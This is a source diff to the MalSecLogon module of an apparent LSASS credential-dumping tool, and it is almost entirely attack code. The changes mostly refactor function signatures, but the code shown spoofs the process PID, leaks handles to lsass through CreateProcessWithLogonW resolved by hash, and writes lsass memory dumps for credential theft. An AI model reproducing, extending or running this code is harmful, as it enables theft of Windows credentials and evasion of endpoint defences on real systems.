@@ -1,11 +1,11 @@
 #include "malseclogon.h"
 #include "handle.h"
+#include "dinvoke.h"
 
 #if defined(NANO) && !defined(SSP)
 
 PHANDLE_LIST find_process_handles_in_lsass(
-    DWORD lsass_pid
-)
+    IN DWORD lsass_pid)
 {
     BOOL success;
 
@@ -65,14 +65,15 @@ PHANDLE_LIST find_process_handles_in_lsass(
     return handle_list;
 }
 
-void change_pid(DWORD new_pid, PDWORD previous_pid)
+VOID change_pid(
+    IN DWORD new_pid,
+    OUT PDWORD previous_pid)
 {
     DWORD current_pid = (DWORD)READ_MEMLOC(CID_OFFSET);
     DPRINT(
         "Changing the current PID from %ld to %ld",
         current_pid,
-        new_pid
-    );
+        new_pid);
     if (previous_pid)
         *previous_pid = current_pid;
     PDWORD pPid = (PDWORD)&(((struct TEB*)NtCurrentTeb())->ClientId);
@@ -80,20 +81,19 @@ void change_pid(DWORD new_pid, PDWORD previous_pid)
     *pPid = new_pid;
 }
 
-void set_command_line(
-    BOOL use_malseclogon_locally,
-    LPWSTR command_line,
-    LPCSTR program_name,
-    LPCSTR dump_path,
-    BOOL fork_lsass,
-    BOOL snapshot_lsass,
-    BOOL use_valid_sig
-)
+VOID set_command_line(
+    IN BOOL use_malseclogon_locally,
+    IN LPWSTR command_line,
+    IN LPCSTR program_name,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    IN BOOL use_valid_sig)
 {
     // program path
     wchar_t program_name_w[MAX_PATH];
     mbstowcs(program_name_w, program_name, MAX_PATH);
-    wcscpy(command_line, L"\"");
+    wcsncpy(command_line, L"\"", MAX_PATH);
     wcsncat(command_line, program_name_w, MAX_PATH);
     wcsncat(command_line, L"\"", MAX_PATH);
     if (!use_malseclogon_locally)
@@ -118,7 +118,9 @@ void set_command_line(
     wcsncat(command_line, L" --stage2", MAX_PATH);
 }
 
-BOOL save_new_process_pid(PPROCESS_LIST process_list, DWORD pid)
+BOOL save_new_process_pid(
+    IN PPROCESS_LIST process_list,
+    IN DWORD pid)
 {
     if (!process_list)
         return TRUE;
@@ -134,16 +136,14 @@ BOOL save_new_process_pid(PPROCESS_LIST process_list, DWORD pid)
 
 // wait until the process exits and check if the dumpfile exists
 BOOL check_if_succeded(
-    DWORD new_pid,
-    LPCSTR dump_path
-)
+    IN DWORD new_pid,
+    IN LPCSTR dump_path)
 {
     // we cannot call WaitForSingleObject on the returned handle in startInfo because the handles are duped into lsass process, we need a new handle
     HANDLE hSpoofedProcess = get_process_handle(
         new_pid,
         SYNCHRONIZE,
-        FALSE
-    );
+        FALSE);
     if (!hSpoofedProcess)
         return FALSE;
 
@@ -158,25 +158,21 @@ BOOL check_if_succeded(
     return TRUE;
 }
 
-void kill_created_processes(
-    PPROCESS_LIST created_processes
-)
+VOID kill_created_processes(
+    IN PPROCESS_LIST created_processes)
 {
     if (!created_processes)
         return;
 
     DPRINT(
         "Killing the %ld created processes",
-        created_processes->Count
-    );
+        created_processes->Count);
     for (DWORD i = 0; i < created_processes->Count; i++)
     {
         kill_process(
             created_processes->ProcessId[i],
-            NULL
-        );
+            NULL);
     }
-    intFree(created_processes); created_processes = NULL;
     DPRINT("The created processes have been killed");
 }
 
@@ -186,21 +182,19 @@ void kill_created_processes(
  * the leaked handle in order to remain fileless
  */
 BOOL MalSecLogon(
-    LPCSTR binary_path,
-    LPCSTR dump_path,
-    BOOL fork_lsass,
-    BOOL snapshot_lsass,
-    BOOL use_valid_sig,
-    BOOL use_malseclogon_locally,
-    DWORD lsass_pid,
-    PPROCESS_LIST* Pcreated_processes
-)
+    IN LPCSTR binary_path,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    IN BOOL use_valid_sig,
+    IN BOOL use_malseclogon_locally,
+    IN DWORD lsass_pid,
+    OUT PPROCESS_LIST* Pcreated_processes)
 {
     PPROCESS_LIST created_processes = NULL;
     BOOL success;
 
     DPRINT("Using MalSecLogon to get a handle to " LSASS);
-    PRINT("[!] MalSecLogon implementation is unstable, errors are to be expected");
     // if MalSecLogon is used to create other processes, save their PID
     if (!use_malseclogon_locally)
     {
@@ -223,8 +217,7 @@ BOOL MalSecLogon(
         use_valid_sig,
         use_malseclogon_locally,
         lsass_pid,
-        created_processes
-    );
+        created_processes);
     if (!success)
     {
         PRINT_ERR("MalSecLogon technique failed!");
@@ -241,22 +234,20 @@ BOOL MalSecLogon(
         print_success(
             dump_path,
             use_valid_sig,
-            TRUE
-        );
+            TRUE);
     }
     return TRUE;
 }
 
 BOOL malseclogon_stage_1(
-    LPCSTR program_name,
-    LPCSTR dump_path,
-    BOOL fork_lsass,
-    BOOL snapshot_lsass,
-    BOOL use_valid_sig,
-    BOOL use_malseclogon_locally,
-    DWORD lsass_pid,
-    PPROCESS_LIST process_list
-)
+    IN LPCSTR program_name,
+    IN LPCSTR dump_path,
+    IN BOOL fork_lsass,
+    IN BOOL snapshot_lsass,
+    IN BOOL use_valid_sig,
+    IN BOOL use_malseclogon_locally,
+    IN DWORD lsass_pid,
+    OUT PPROCESS_LIST process_list)
 {
     BOOL success;
     PHANDLE_LIST handle_list;
@@ -278,12 +269,10 @@ BOOL malseclogon_stage_1(
         dump_path,
         fork_lsass,
         snapshot_lsass,
-        use_valid_sig
-    );
+        use_valid_sig);
 
     handle_list = find_process_handles_in_lsass(
-        lsass_pid
-    );
+        lsass_pid);
     if (!handle_list)
     {
         DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
@@ -294,8 +283,7 @@ BOOL malseclogon_stage_1(
     {
         PRINT_ERR(
             "No handles found in " LSASS ", is the PID %ld correct?.",
-            lsass_pid
-        );
+            lsass_pid);
         intFree(handle_list); handle_list = NULL;
         return FALSE;
     }
@@ -314,19 +302,13 @@ BOOL malseclogon_stage_1(
     CreateProcessWithLogonW = (CreateProcessWithLogonW_t)(ULONG_PTR)get_function_address(
         get_library_address(ADVAPI32_DLL, TRUE),
         CreateProcessWithLogonW_SW2_HASH,
-        0
-    );
+        0);
     if (!CreateProcessWithLogonW)
     {
-        DPRINT_ERR("Address of 'CreateProcessWithLogonW' not found");
-        DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
+        api_not_found("CreateProcessWithLogonW");
         intFree(handle_list); handle_list = NULL;
         return FALSE;
     }
-    DPRINT(
-        "Got address of CreateProcessWithLogonW: 0x%p",
-        (PVOID)CreateProcessWithLogonW
-    );
 
     DWORD handles_leaked = 0;
     while (handles_leaked < handle_list->Count)
@@ -354,8 +336,7 @@ BOOL malseclogon_stage_1(
             NULL,
             NULL,
             &startInfo,
-            &procInfo
-        );
+            &procInfo);
         if (!success)
         {
             function_failed("CreateProcessWithLogonW");
@@ -370,8 +351,7 @@ BOOL malseclogon_stage_1(
             procInfo.dwProcessId,
             (DWORD)(ULONG_PTR)startInfo.hStdInput,
             (DWORD)(ULONG_PTR)startInfo.hStdOutput,
-            (DWORD)(ULONG_PTR)startInfo.hStdError
-        );
+            (DWORD)(ULONG_PTR)startInfo.hStdError);
 
         // save the PID of the newly created process
         success = save_new_process_pid(process_list, procInfo.dwProcessId);
@@ -388,14 +368,12 @@ BOOL malseclogon_stage_1(
         {
             success = check_if_succeded(
                 procInfo.dwProcessId,
-                dump_path
-            );
+                dump_path);
             if (success)
             {
                 DPRINT(
                     "The dump was succesfully created at %s",
-                    dump_path
-                );
+                    dump_path);
                 change_pid(original_pid, NULL);
                 intFree(handle_list); handle_list = NULL;
                 return TRUE;
@@ -418,8 +396,7 @@ BOOL malseclogon_stage_1(
         // all the processes with the leaked handles have been created
         DPRINT(
             "Created %ld processes, trying to duplicate one of the leaked handles to " LSASS,
-            process_list->Count
-        );
+            process_list->Count);
         return TRUE;
     }
 }
@@ -427,8 +404,7 @@ BOOL malseclogon_stage_1(
 #ifdef EXE
 
 HANDLE malseclogon_stage_2(
-    LPCSTR dump_path
-)
+    IN LPCSTR dump_path)
 {
     // if the file already exists, exit
     if (file_exists(dump_path))
